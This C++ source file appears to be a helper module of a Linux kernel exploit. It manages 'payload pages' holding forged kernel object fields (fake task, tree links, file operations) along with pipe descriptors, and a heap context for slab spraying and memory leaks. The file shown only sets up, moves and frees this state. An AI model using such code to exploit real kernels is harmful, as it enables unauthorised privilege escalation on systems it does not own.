#include "memory/heap_context.h"

#include <string.h>
#include <unistd.h>

#include <utility>

namespace {

/* Return the page to the empty state without touching any fd. Ownership
 * release is always explicit (destroy()), never scope-exit. */
void clear_page(PayloadPage &page) noexcept {
    page.base = 0;
    page.last_mm_struct = 0;
    page.fake_lock = 0;
    page.fake_w0 = 0;
    page.fake_task = 0;
    page.fake_parent = 0;
    page.fake_right = 0;
    page.fake_left = 0;
    page.fake_fops = 0;
    page.reclaim.fd[0] = -1;
    page.reclaim.fd[1] = -1;
    page.state = PAYLOAD_PAGE_EMPTY;
}

}  // namespace

PayloadPage::PayloadPage() noexcept { clear_page(*this); }

PayloadPage::PayloadPage(PayloadPage &&other) noexcept : PayloadPage() {
    (void) other.move_to(*this, other.state);
}

bool PayloadPage::has_reclaim() const noexcept {
    return reclaim.fd[0] >= 0 && reclaim.fd[1] >= 0;
}

void PayloadPage::destroy() noexcept {
    for (int i = 0; i < 2; i++) {
        if (reclaim.fd[i] >= 0) close(reclaim.fd[i]);
    }
    clear_page(*this);
}

bool PayloadPage::move_to(PayloadPage &destination,
        PayloadPageState destination_state) noexcept {
    if (&destination == this || destination.state != PAYLOAD_PAGE_EMPTY ||
            !has_reclaim()) {
        return false;
    }
    destination.base = base;
    destination.last_mm_struct = last_mm_struct;
    destination.fake_lock = fake_lock;
    destination.fake_w0 = fake_w0;
    destination.fake_task = fake_task;
    destination.fake_parent = fake_parent;
    destination.fake_right = fake_right;
    destination.fake_left = fake_left;
    destination.fake_fops = fake_fops;
    destination.reclaim.fd[0] = reclaim.fd[0];
    destination.reclaim.fd[1] = reclaim.fd[1];
    destination.state = destination_state;
    clear_page(*this);
    return true;
}

void heap_context_init(HeapContext *context) {
    if (!context) return;
    context->snitch = nullptr;
    context->mm_objs_per_slab = 0;
    context->skb_buffer = nullptr;
    context->prepare = mm_ctx{};
    context->spray = mm_ctx{};
    context->pre = mm_ctx{};
    context->post = mm_ctx{};
    context->leak_child = 0;
    context->leak_memfd = -1;
    context->current.destroy();
    context->prebuilt.destroy();
    context->quarantine.destroy();
}

int payload_page_has_reclaim(const PayloadPage *page) {
    return page && page->has_reclaim();
}

void payload_page_destroy(PayloadPage *page) {
    if (page) page->destroy();
}

int payload_page_move(
        PayloadPage *destination, PayloadPage *source,
        PayloadPageState destination_state) {
    if (!destination || !source) return 0;
    return source->move_to(*destination, destination_state) ? 1 : 0;
}
